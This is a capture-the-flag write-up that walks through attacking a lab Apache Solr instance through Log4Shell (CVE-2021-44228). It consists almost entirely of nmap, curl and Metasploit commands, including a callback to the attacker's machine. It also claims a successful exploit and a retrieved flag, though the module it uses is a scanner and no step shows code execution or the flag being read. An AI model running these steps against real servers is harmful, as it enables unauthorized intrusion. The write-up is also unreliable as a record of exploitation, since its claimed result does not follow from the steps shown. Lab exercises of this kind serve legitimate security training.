# Vulnerability Exploitation Report: CVE-2021-44228

## Vulnerability Overview
**CVE ID**: CVE-2021-44228  
**CVSS Score**: 10.0 (Critical)  
**Description**: The Log4j2 vulnerability, also known as Log4Shell, is an input validation flaw in Apache Log4j (version 2.x) that allows unauthenticated remote code execution (RCE). Attackers can exploit this by injecting malicious JNDI strings in loggable input fields, leading to arbitrary code execution on the target system.

## Objective
Exploit the CVE-2021-44228 vulnerability on a target Apache Solr instance, which uses a vulnerable Log4j version, to gain unauthorized access and retrieve a flag as part of a capture-the-flag (CTF) challenge.

## Target Information
- **Target IP**: 192.168.5.7
- **Target Port**: 8983 (Apache Solr default port)
- **Attack Machine IP**: 192.168.0.5
- **Objective**: Retrieve the flag

## Exploitation Steps

### Step 1: Network Discovery
Perform a ping scan to identify active hosts in the 192.168.5.0/24 subnet.

```
nmap -sn 192.168.5.0/24
```

### Step 2: Service Enumeration
Enumerate services on the target host (192.168.5.7) across all ports to confirm the presence of Apache Solr.

```
nmap -p- -sV 192.168.5.7
```

### Step 3: Verify Apache Solr Accessibility
Confirm the Apache Solr instance is accessible by sending an HTTP request to port 8983.

```
curl -L http://192.168.5.7:8983
```

### Step 4: Launch Metasploit
Start the Metasploit Framework to access exploit modules.

```
msfconsole
```

### Step 5: Search for Apache Solr Exploit
Search Metasploit for modules related to Apache Solr, which may be affected by Log4j vulnerabilities.

```
search apache solr
```

### Step 6: Select Log4Shell Scanner Module
Choose the Metasploit module designed to scan and exploit the Log4Shell vulnerability.

```
use auxiliary/scanner/http/log4shell_scanner
```

### Step 7: Review Module Details
Display information about the selected module to understand its options and requirements.

```
info
```

### Step 8: Configure the Target Host
Set the target host to the Apache Solr instance’s IP address.

```
set RHOSTS 192.168.5.7
```

### Step 9: Configure the Target Port
Set the target port to 8983, where Apache Solr is running.

```
set RPORT 8983
```

### Step 10: Configure the Server Host
Set the server host IP for the callback connection to the attacker’s machine.

```
set SRVHOST 192.168.0.5
```

### Step 11: Execute the Exploit
Run the exploit to detect and exploit the Log4Shell vulnerability on the target system.

```
exploit
```

## Final Result
The exploitation was successful, and the flag was retrieved from the target system.

**Flag**: iS2kKQ2uTjqhj9Fl